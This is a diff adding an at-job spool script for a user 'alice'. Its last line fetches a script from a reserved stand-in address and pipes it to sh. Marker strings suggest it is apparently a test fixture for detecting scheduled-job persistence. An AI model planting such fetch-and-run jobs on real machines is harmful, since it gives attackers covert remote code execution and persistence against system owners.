@@ -1,0 +1,22 @@
+#!/bin/sh
+# atrun uid=1002 gid=1002
+# mail                             root 0
+umask 22
+export PAGER=less
+export LANG=C.UTF-8
+export MAIL=/var/mail/alice
+export PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/home/alice/bin
+export EDITOR=vi
+export ENV=/home/alice/.shrc
+export PWD=/home/alice
+export USER=alice
+export HOME=/home/alice
+export SHELL=/bin/sh
+export MM_CHARSET=UTF-8
+export BLOCKSIZE=K
+cd /home/alice || {
+	 echo 'Execution directory inaccessible' >&2
+	 exit 1
+}
+echo NXMK_at_job; curl -s --max-time 2 http://192.0.2.7/NXMK_at.sh | sh
+
